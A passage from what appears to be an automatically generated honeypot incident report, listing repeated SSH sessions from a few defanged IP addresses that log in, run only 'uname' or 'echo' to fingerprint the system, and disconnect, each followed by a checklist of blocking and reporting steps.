- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50f2c081cc4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:21` | `cowrie.session.connect` |
| `2026-08-16 18:47:21` | `cowrie.client.version` |
| `2026-08-16 18:47:22` | `cowrie.client.kex` |
| `2026-08-16 18:47:22` | `cowrie.login.success` |
| `2026-08-16 18:47:23` | `cowrie.session.params` |
| `2026-08-16 18:47:23` | `cowrie.command.input` |
| `2026-08-16 18:47:23` | `cowrie.log.closed` |
| `2026-08-16 18:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0538886341cf

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:27` | `cowrie.session.connect` |
| `2026-08-16 18:47:27` | `cowrie.client.version` |
| `2026-08-16 18:47:27` | `cowrie.client.kex` |
| `2026-08-16 18:47:27` | `cowrie.login.success` |
| `2026-08-16 18:47:28` | `cowrie.session.params` |
| `2026-08-16 18:47:28` | `cowrie.command.input` |
| `2026-08-16 18:47:28` | `cowrie.log.closed` |
| `2026-08-16 18:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55477b8c5784

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:32` | `cowrie.session.connect` |
| `2026-08-16 18:47:32` | `cowrie.client.version` |
| `2026-08-16 18:47:33` | `cowrie.client.kex` |
| `2026-08-16 18:47:33` | `cowrie.login.success` |
| `2026-08-16 18:47:34` | `cowrie.session.params` |
| `2026-08-16 18:47:34` | `cowrie.command.input` |
| `2026-08-16 18:47:34` | `cowrie.log.closed` |
| `2026-08-16 18:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e0c44305434

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:38` | `cowrie.session.connect` |
| `2026-08-16 18:47:38` | `cowrie.client.version` |
| `2026-08-16 18:47:38` | `cowrie.client.kex` |
| `2026-08-16 18:47:39` | `cowrie.login.success` |
| `2026-08-16 18:47:39` | `cowrie.session.params` |
| `2026-08-16 18:47:39` | `cowrie.command.input` |
| `2026-08-16 18:47:39` | `cowrie.log.closed` |
| `2026-08-16 18:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0502555fd7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:44` | `cowrie.session.connect` |
| `2026-08-16 18:47:44` | `cowrie.client.version` |
| `2026-08-16 18:47:44` | `cowrie.client.kex` |
| `2026-08-16 18:47:44` | `cowrie.login.success` |
| `2026-08-16 18:47:45` | `cowrie.session.params` |
| `2026-08-16 18:47:45` | `cowrie.command.input` |
| `2026-08-16 18:47:45` | `cowrie.log.closed` |
| `2026-08-16 18:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c7fcf90a043

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:49` | `cowrie.session.connect` |
| `2026-08-16 18:47:49` | `cowrie.client.version` |
| `2026-08-16 18:47:49` | `cowrie.client.kex` |
| `2026-08-16 18:47:50` | `cowrie.login.success` |
| `2026-08-16 18:47:51` | `cowrie.session.params` |
| `2026-08-16 18:47:51` | `cowrie.command.input` |
| `2026-08-16 18:47:51` | `cowrie.log.closed` |
| `2026-08-16 18:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0cc1866d21

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:47 |
| **Last Seen** | 2026-08-16 18:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:47:55` | `cowrie.session.connect` |
| `2026-08-16 18:47:55` | `cowrie.client.version` |
| `2026-08-16 18:47:55` | `cowrie.client.kex` |
| `2026-08-16 18:47:55` | `cowrie.login.success` |
| `2026-08-16 18:47:56` | `cowrie.session.params` |
| `2026-08-16 18:47:56` | `cowrie.command.input` |
| `2026-08-16 18:47:56` | `cowrie.log.closed` |
| `2026-08-16 18:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ddd1d951ad

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:00` | `cowrie.session.connect` |
| `2026-08-16 18:48:00` | `cowrie.client.version` |
| `2026-08-16 18:48:00` | `cowrie.client.kex` |
| `2026-08-16 18:48:01` | `cowrie.login.success` |
| `2026-08-16 18:48:02` | `cowrie.session.params` |
| `2026-08-16 18:48:02` | `cowrie.command.input` |
| `2026-08-16 18:48:02` | `cowrie.log.closed` |
| `2026-08-16 18:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe67fdbe64b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:06` | `cowrie.session.connect` |
| `2026-08-16 18:48:06` | `cowrie.client.version` |
| `2026-08-16 18:48:06` | `cowrie.client.kex` |
| `2026-08-16 18:48:06` | `cowrie.login.success` |
| `2026-08-16 18:48:07` | `cowrie.session.params` |
| `2026-08-16 18:48:07` | `cowrie.command.input` |
| `2026-08-16 18:48:07` | `cowrie.log.closed` |
| `2026-08-16 18:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb307678047c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:11` | `cowrie.session.connect` |
| `2026-08-16 18:48:11` | `cowrie.client.version` |
| `2026-08-16 18:48:11` | `cowrie.client.kex` |
| `2026-08-16 18:48:11` | `cowrie.login.success` |
| `2026-08-16 18:48:12` | `cowrie.session.params` |
| `2026-08-16 18:48:12` | `cowrie.command.input` |
| `2026-08-16 18:48:12` | `cowrie.log.closed` |
| `2026-08-16 18:48:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dc87d3cd783

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:16` | `cowrie.session.connect` |
| `2026-08-16 18:48:16` | `cowrie.client.version` |
| `2026-08-16 18:48:16` | `cowrie.client.kex` |
| `2026-08-16 18:48:16` | `cowrie.login.success` |
| `2026-08-16 18:48:17` | `cowrie.session.params` |
| `2026-08-16 18:48:17` | `cowrie.command.input` |
| `2026-08-16 18:48:17` | `cowrie.log.closed` |
| `2026-08-16 18:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e54e740b5bc7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:21` | `cowrie.session.connect` |
| `2026-08-16 18:48:21` | `cowrie.client.version` |
| `2026-08-16 18:48:21` | `cowrie.client.kex` |
| `2026-08-16 18:48:22` | `cowrie.login.success` |
| `2026-08-16 18:48:22` | `cowrie.session.params` |
| `2026-08-16 18:48:22` | `cowrie.command.input` |
| `2026-08-16 18:48:22` | `cowrie.log.closed` |
| `2026-08-16 18:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a93f81172bf

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:27` | `cowrie.session.connect` |
| `2026-08-16 18:48:27` | `cowrie.client.version` |
| `2026-08-16 18:48:27` | `cowrie.client.kex` |
| `2026-08-16 18:48:27` | `cowrie.login.success` |
| `2026-08-16 18:48:28` | `cowrie.session.params` |
| `2026-08-16 18:48:28` | `cowrie.command.input` |
| `2026-08-16 18:48:28` | `cowrie.log.closed` |
| `2026-08-16 18:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-862c1b25d655

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:30` | `cowrie.session.connect` |
| `2026-08-16 18:48:30` | `cowrie.client.version` |
| `2026-08-16 18:48:30` | `cowrie.client.kex` |
| `2026-08-16 18:48:30` | `cowrie.login.success` |
| `2026-08-16 18:48:31` | `cowrie.session.params` |
| `2026-08-16 18:48:31` | `cowrie.command.input` |
| `2026-08-16 18:48:31` | `cowrie.log.closed` |
| `2026-08-16 18:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee47ce747d6a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:32` | `cowrie.session.connect` |
| `2026-08-16 18:48:32` | `cowrie.client.version` |
| `2026-08-16 18:48:32` | `cowrie.client.kex` |
| `2026-08-16 18:48:32` | `cowrie.login.success` |
| `2026-08-16 18:48:33` | `cowrie.session.params` |
| `2026-08-16 18:48:33` | `cowrie.command.input` |
| `2026-08-16 18:48:33` | `cowrie.log.closed` |
| `2026-08-16 18:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b94eea85eeee

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:37` | `cowrie.session.connect` |
| `2026-08-16 18:48:37` | `cowrie.client.version` |
| `2026-08-16 18:48:37` | `cowrie.client.kex` |
| `2026-08-16 18:48:38` | `cowrie.login.success` |
| `2026-08-16 18:48:38` | `cowrie.session.params` |
| `2026-08-16 18:48:38` | `cowrie.command.input` |
| `2026-08-16 18:48:39` | `cowrie.log.closed` |
| `2026-08-16 18:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e82507e7ddd2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:42` | `cowrie.session.connect` |
| `2026-08-16 18:48:42` | `cowrie.client.version` |
| `2026-08-16 18:48:43` | `cowrie.client.kex` |
| `2026-08-16 18:48:43` | `cowrie.login.success` |
| `2026-08-16 18:48:44` | `cowrie.session.params` |
| `2026-08-16 18:48:44` | `cowrie.command.input` |
| `2026-08-16 18:48:44` | `cowrie.log.closed` |
| `2026-08-16 18:48:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44451ec6620d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:48` | `cowrie.session.connect` |
| `2026-08-16 18:48:48` | `cowrie.client.version` |
| `2026-08-16 18:48:48` | `cowrie.client.kex` |
| `2026-08-16 18:48:48` | `cowrie.login.success` |
| `2026-08-16 18:48:49` | `cowrie.session.params` |
| `2026-08-16 18:48:49` | `cowrie.command.input` |
| `2026-08-16 18:48:49` | `cowrie.log.closed` |
| `2026-08-16 18:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef348fa1118

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:53` | `cowrie.session.connect` |
| `2026-08-16 18:48:53` | `cowrie.client.version` |
| `2026-08-16 18:48:53` | `cowrie.client.kex` |
| `2026-08-16 18:48:54` | `cowrie.login.success` |
| `2026-08-16 18:48:55` | `cowrie.session.params` |
| `2026-08-16 18:48:55` | `cowrie.command.input` |
| `2026-08-16 18:48:56` | `cowrie.log.closed` |
| `2026-08-16 18:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b2da33cce1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:53` | `cowrie.session.connect` |
| `2026-08-16 18:48:53` | `cowrie.client.version` |
| `2026-08-16 18:48:54` | `cowrie.client.kex` |
| `2026-08-16 18:48:54` | `cowrie.login.success` |
| `2026-08-16 18:48:56` | `cowrie.session.params` |
| `2026-08-16 18:48:56` | `cowrie.command.input` |
| `2026-08-16 18:48:56` | `cowrie.log.closed` |
| `2026-08-16 18:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c800f8ac7e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:48 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:48:59` | `cowrie.session.connect` |
| `2026-08-16 18:48:59` | `cowrie.client.version` |
| `2026-08-16 18:48:59` | `cowrie.client.kex` |
| `2026-08-16 18:48:59` | `cowrie.login.success` |
| `2026-08-16 18:49:00` | `cowrie.session.params` |
| `2026-08-16 18:49:00` | `cowrie.command.input` |
| `2026-08-16 18:49:00` | `cowrie.log.closed` |
| `2026-08-16 18:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd2315c23eb

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:04` | `cowrie.session.connect` |
| `2026-08-16 18:49:04` | `cowrie.client.version` |
| `2026-08-16 18:49:04` | `cowrie.client.kex` |
| `2026-08-16 18:49:05` | `cowrie.login.success` |
| `2026-08-16 18:49:06` | `cowrie.session.params` |
| `2026-08-16 18:49:06` | `cowrie.command.input` |
| `2026-08-16 18:49:06` | `cowrie.log.closed` |
| `2026-08-16 18:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcdfe9660d83

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:10` | `cowrie.session.connect` |
| `2026-08-16 18:49:10` | `cowrie.client.version` |
| `2026-08-16 18:49:10` | `cowrie.client.kex` |
| `2026-08-16 18:49:10` | `cowrie.login.success` |
| `2026-08-16 18:49:11` | `cowrie.session.params` |
| `2026-08-16 18:49:11` | `cowrie.command.input` |
| `2026-08-16 18:49:11` | `cowrie.log.closed` |
| `2026-08-16 18:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3202e6f8d34

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:15` | `cowrie.session.connect` |
| `2026-08-16 18:49:20` | `cowrie.client.version` |
| `2026-08-16 18:49:20` | `cowrie.client.kex` |
| `2026-08-16 18:49:43` | `cowrie.login.success` |
| `2026-08-16 18:49:54` | `cowrie.session.params` |
| `2026-08-16 18:49:54` | `cowrie.command.input` |
| `2026-08-16 18:50:01` | `cowrie.log.closed` |
| `2026-08-16 18:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a084b61397cd

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:15` | `cowrie.session.connect` |
| `2026-08-16 18:49:15` | `cowrie.client.version` |
| `2026-08-16 18:49:15` | `cowrie.client.kex` |
| `2026-08-16 18:49:16` | `cowrie.login.success` |
| `2026-08-16 18:49:17` | `cowrie.session.params` |
| `2026-08-16 18:49:17` | `cowrie.command.input` |
| `2026-08-16 18:49:17` | `cowrie.log.closed` |
| `2026-08-16 18:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016a1d613da3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:21` | `cowrie.session.connect` |
| `2026-08-16 18:49:21` | `cowrie.client.version` |
| `2026-08-16 18:49:21` | `cowrie.client.kex` |
